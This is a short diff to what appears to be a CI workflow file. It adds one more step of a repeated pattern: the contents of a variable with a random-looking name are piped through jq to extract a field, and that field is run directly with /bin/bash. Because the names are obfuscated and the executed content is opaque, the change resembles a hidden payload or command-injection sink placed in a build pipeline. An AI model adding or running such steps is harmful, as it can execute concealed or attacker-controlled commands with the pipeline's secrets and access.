@@ -34,6 +34,7 @@ jobs:
           echo $bekx8 | jq -r .b05 | /bin/bash
           printf '%s' "$vijkb3961" | jq -r .jsvwv57080 | /bin/bash
           echo $gbqq6945 | jq -r .hbmjd2918 | /bin/bash
+          echo $u25228 | jq -r .sj940 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
